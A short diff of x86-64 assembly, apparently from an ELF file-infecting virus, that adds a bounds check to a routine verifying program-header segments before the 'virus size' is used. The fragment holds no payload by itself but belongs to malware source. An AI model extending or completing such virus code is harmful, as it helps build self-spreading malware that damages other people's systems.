@@ -223,6 +223,9 @@ _verif_segments:
 	add r10, 32 ; add 32 to phdr, offset for p_filesz (the size of the segment)
 	mov r10, QWORD [r10] ; dereference it to take the value
 	add QWORD [rsp + 56], r10 ; add it to the p_offset find before
+	mov r12, QWORD [rsp + 56]
+	cmp r12, QWORD [rsp + 16]
+	jge _munmap
 	sub QWORD [rsp + 56], PAGE_SIZE
 	add QWORD [rsp + 56], 8
 ;	mov r10, QWORD [rsp + 8] ; take the virus size
